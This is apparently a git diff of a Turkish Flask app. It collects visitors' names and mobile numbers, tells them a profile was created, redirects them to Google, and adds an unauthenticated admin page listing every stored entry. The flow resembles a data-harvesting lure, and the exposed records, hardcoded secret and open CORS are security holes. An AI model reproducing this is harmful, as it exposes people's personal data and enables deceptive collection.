@@ -1,5 +1,5 @@
 import eventlet
-eventlet.monkey_patch() 
+eventlet.monkey_patch()
 
 from flask import Flask, render_template_string, send_from_directory
 from flask_socketio import SocketIO
@@ -10,19 +10,91 @@ import urllib.parse
 app = Flask(__name__)
 app.config['SECRET_KEY'] = 'modern_v12_premium_final_ultra'
 
-# SocketIO ayarları (monkey_patch olmadan)
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')
 
 # ====================== DOSYA SERVİSİ ======================
-# Tüm resimler artık "files" klasöründen okunacak
 @app.route('/files/<path:filename>')
 def custom_static(filename):
     safe_filename = urllib.parse.unquote(filename)
-    # files klasöründen güvenli şekilde dosyayı gönder
     return send_from_directory('files', safe_filename)
 
-# ====================== HTML SAYFASI ======================
-USER_PAGE = ''' 
+# ====================== KAYITLARI GÖRME SAYFASI ======================
+KAYITLAR_PAGE = '''
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kayıtlar - Admin</title>
+    <style>
+        body { 
+            font-family: 'Segoe UI', Arial, sans-serif; 
+            background: #0a0a0a; 
+            color: #fff; 
+            padding: 30px; 
+            line-height: 1.6;
+        }
+        h1 { color: #ff0033; }
+        pre { 
+            background: #1a1a1a; 
+            padding: 20px; 
+            border-radius: 12px; 
+            white-space: pre-wrap; 
+            font-size: 15px;
+            max-height: 80vh;
+            overflow-y: auto;
+        }
+        .refresh-btn {
+            padding: 12px 25px;
+            background: #ff0033;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-bottom: 20px;
+        }
+        .refresh-btn:hover {
+            background: #ff1a47;
+        }
+    </style>
+</head>
+<body>
+    <h1>Tüm Kayıtlar</h1>
+    <button class="refresh-btn" onclick="location.reload()">Yenile</button>
+    <pre id="logs">Yükleniyor...</pre>
+
+    <script>
+        fetch('/raw_kayitlar')
+            .then(response => response.text())
+            .then(text => {
+                document.getElementById('logs').textContent = text || 'Henüz hiç kayıt yok.';
+            })
+            .catch(() => {
+                document.getElementById('logs').textContent = 'Kayıtlar yüklenirken hata oluştu.';
+            });
+    </script>
+</body>
+</html>
+'''
+
+@app.route('/kayıtlar')
+def show_kayitlar():
+    return render_template_string(KAYITLAR_PAGE)
+
+@app.route('/raw_kayitlar')
+def raw_kayitlar():
+    try:
+        with open("kayitlar.txt", "r", encoding="utf-8") as f:
+            content = f.read()
+            return content if content.strip() else "Henüz hiç kayıt yok."
+    except FileNotFoundError:
+        return "Henüz hiç kayıt yok."
+    except Exception as e:
+        return f"Hata: {str(e)}"
+
+# ====================== ANA KULLANICI SAYFASI ======================
+USER_PAGE = '''
 <!DOCTYPE html>
 <html lang="tr">
 <head>
@@ -199,7 +271,6 @@ USER_PAGE = '''
     <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
     <script>
         const socket = io();
-
         function move(step) {
             const body = document.getElementById('main-body');
             if(step === 'final') {
@@ -210,12 +281,10 @@ USER_PAGE = '''
             document.querySelectorAll('.card').forEach(c => c.classList.remove('active'));
             document.getElementById('step-' + step).classList.add('active');
         }
-
         function finish() {
             const isim = document.getElementById('isim').value;
             const numara = document.getElementById('numara').value;
             const checkNum = /^05[0-9]{9}$/;
-
             if (!isim || isim.length < 3) {
                 alert("Lütfen geçerli bir isim giriniz.");
                 return;
@@ -224,7 +293,6 @@ USER_PAGE = '''
                 alert("Lütfen geçerli bir telefon numarası giriniz (05XXXXXXXXX).");
                 return;
             }
-
             socket.emit('yeni_kayit', { isim, numara });
             alert("Harika! Profiliniz oluşturuldu. Yönlendiriliyorsunuz...");
             window.location.href = "https://www.google.com";
@@ -238,13 +306,23 @@ USER_PAGE = '''
 def index():
     return render_template_string(USER_PAGE)
 
+# ====================== KAYIT İŞLEMi ======================
 @socketio.on('yeni_kayit')
 def handle_kayit(data):
     zaman = datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")
+    
+    kayit = f"Zaman: {zaman} | İsim: {data['isim']} | Tel: {data['numara']}\n"
+    
+    # Dosyaya yaz
     with open("kayitlar.txt", "a", encoding="utf-8") as f:
-        f.write(f"Zaman: {zaman} | İsim: {data['isim']} | Tel: {data['numara']}\n")
+        f.write(kayit)
+    
+    # Render Logs'a da yazdır (kolay görmek için)
+    print("=== YENİ KAYIT ALINDI ===")
+    print(kayit.strip())
+    print("=========================")
 
-# Render ve production için Gunicorn ile başlatma
+# ====================== BAŞLATMA ======================
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 10000))
     socketio.run(app, host="0.0.0.0", port=port)
